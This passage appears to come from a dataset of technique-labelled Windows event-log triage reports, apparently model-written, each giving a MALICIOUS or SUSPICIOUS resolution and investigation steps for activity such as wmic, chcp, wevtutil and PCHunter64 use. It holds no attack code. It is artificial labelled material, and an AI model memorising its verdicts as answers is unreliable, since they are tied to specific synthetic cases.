   - A driver `MpKslDrv.sys` associated with Windows Defender updates was loaded (Event ID 7045), which is typical in updates but should be validated to ensure it wasn't tampered with due to other suspicious activities.
   - Certificate operations related to `CAPI2` logs seem standard and don't immediately suggest tampering.

**Assessment and Resolution:**

The combination of elevated privileges provided to an account, the network logons from an external machine with NTLM, rapid logon-logoff sequences, and the execution of a tool like `PCHunter64.exe`, suggest actions that are not typically observed under normal administrative behavior. These could potentially indicate malicious activity, such as unauthorized remote access and use of administrative privileges for deep system probing or compromise.

**Resolution:** **MALICIOUS**

**Guidance on How to Proceed:**
1. Investigate the source `DESKTOP-3HL5B2P` to determine if this machine is compromised or unauthorized.
2. Review the use and installation of `PCHunter64.exe` on this server to understand its necessity and intent.
3. Audit the `admin_test` account for any unauthorized activities, consider temporary suspension, and enforce a credential change.
4. Check for additional compromise in the network, focusing on lateral movement or other affected machines.
5. Ensure log integrity and secure important log files to prevent further manipulation during the investigation.
6. Conduct endpoint scans for known malware or indicators of compromise (IoCs) across systems accessing the network."
Discover System Language with chcp,"**Detailed Analysis of the Logs:**

In assessing the provided Windows event logs, I have scanned through each of them to identify any activities that could potentially indicate malicious actions:

1. **Repeated Execution of System Utilities**:
   - The Sysmon logs show multiple executions of `wevtutil.exe` and `conhost.exe`. `wevtutil.exe` is a legitimate Windows utility used for querying event logs, but its repeated execution in quick succession could suggest an attempt to access or manipulate logs.
   - These processes were executed by the user `SERVER002\admin_test` at a high integrity level, which is often necessary for administrative tasks but can also be exploited for malicious purposes.
   
2. **High Privilege Logs**:
   - Security logs include privileges such as `SeDebugPrivilege`, which is indicative of potential unauthorized activities. These privileges are significant as they allow powerful capabilities on a Windows machine.
   - Two privileged logon events (`4672`) were observed, one immediately after a logoff (`4634`). This could point towards privilege escalations or attempts to shift user contexts.

3. **Time Manipulations**:
   - The System and Security logs capture time adjustments, where the system time was moved backwards, indicated by Event ID `1` from Kernel-General and Event ID `4616`. Time changes can be used to manipulate timestamps in logs, potentially as part of anti-forensic techniques.

4. **Network Services and Task Host Processes**:
   - Regular system tasks and services like `svchost.exe`, `sppsvc.exe`, `TiWorker.exe`, and `WmiPrvSE.exe` have been logged, which generally constitute routine system operations. However, without more context, their solitary entries are largely unremarkable.

5. **Command-line Activity**:
   - A `cmd.exe` instance executed the `chcp` command, which changes code pages and could be considered innocuous. However, actioning on `chcp` through `cmd.exe` could also be allied with script initiation or command chaining, common in exploitation frameworks.

6. **No Obvious Malware Artifacts**:
   - There were no direct indicators of known malware signatures or hash mismatches noted.
   - The use of standard Windows utilities and services largely remains consistent with typical administrative operations, albeit with high privileges.

**Assessment and Threat/Risk Identification:**

The confluence of processes executed with high privileges, combined with possible anti-forensic activity like time manipulation, constructs a concerning picture. While there are no direct signs of malware, such behavior often precedes or accompanies malicious operations, particularly data exfiltration, log tampering, or unauthorized access persistence.

**Guidance on How to Proceed:**

1. **Immediate Actions**:
   - Conduct a thorough review of user `admin_test` account activities and privileges. Reset or revise access credentials/policies as necessary.
   - Inspect any abnormal or unexplained access patterns from source IPs noted in the logs.

2. **Further Investigation**:
   - Cross-reference these events with network logs to check for corresponding or compounded remote connections or data transmissions.
   - Utilize more in-depth forensic tools or constructs (like memory analysis) to inspect any suspicious process loads in real-time.

3. **Monitoring and Patching**:
   - Ensure real-time monitoring is enhanced for any further privileged account misuses or time adjustments.
   - Update and fully patch security detections systems to ensure any potential exploitation vectors are remediated.

**Resolution: SUSPICIOUS**

The set of activities needs further investigation as it contains suspicious activity indicative of potential privilege misuse or preparatory steps for a more comprehensive attack."
Process Discovery - wmic process,"The Windows event logs provided for the investigation reveal several areas of interest. Let's break down the logs:

1. **Application Log:**
   - A standard SPP (Software Protection Platform) service log entry is identified. This appears benign as it typically relates to regular system maintenance or software validation processes.

2. **Security Log:**
   - Both EventID 4616 entries indicate time change events executed by the `svchost.exe` process under `LOCAL SERVICE` account. Unauthorized time changes can sometimes suggest manipulation attempts to cover tracks of unauthorized activity. However, in the context presented, these appear system-initiated and part of legitimate time synchronization, as no other related suspicious activity is linked.

3. **Sysmon Log:**
   - Processes such as `wevtutil.exe`, `cmd.exe`, and `wmic.exe` were observed executed under the user `SERVER002\admin_test`. While these processes can be legitimate, they are also commonly used for administrative tasks or post-exploitation activities. 
   - `wevtutil.exe` is typically employed to manage event logs, which is potentially suspicious without context of needing log modifications.
   - `cmd.exe` executing `wmic` commands is another red flag due to its dual-use nature which attackers commonly leverage for reconnaissance or system enumeration.
   - The appearance of `whoami.exe` indicates checking for user identity, which could be legitimate or part of enumeration by an attacker.
   - The `sysmon` events show `cmd.exe` launching PowerShell-like commands, indicating potential manual interactions. 
   - Overall, these activities are consistent with someone trying to understand or change the system environment.

4. **System Log:**
   - Verified time synchronization and adjustments that coincide with the `security` log entries proving these were legitimate time corrections rather than nefarious time manipulation.

**Assessment:**
Although some processes like `whoami.exe`, `cmd.exe`, `wmic.exe`, and `wevtutil.exe` can be used maliciously, in isolation their execution does not conclusively prove malicious activity. There are a lot of administrative or diagnostic programs used here very close in time, which suggests possible administrator troubleshooting or investigation. However, without additional context or corroborating indicators (such as network anomalies, suspicious file modifications, or further security alert information), these entries are mostly indicative of either legitimate administrative activity or require further scrutiny to ascertain intent.

**Resolution: SUSPICIOUS**
This activity, while not definitively malicious, is suspicious due to the potential for misuse, particularly if not matched with a legitimate maintenance window. It is recommended to:
- Verify with the administration team whether they performed these tasks during that time.
- Review network logs or EDR telemetry around this time for any irregular connections or command and control activity.
- Evaluate if `admin_test` account activities fit within what is expected for that user and investigate any deviations.

If further investigation corroborates these activities as unauthorized or correlates with other suspicious indicators, reclassify the resolution to MALICIOUS and take appropriate incident response actions."
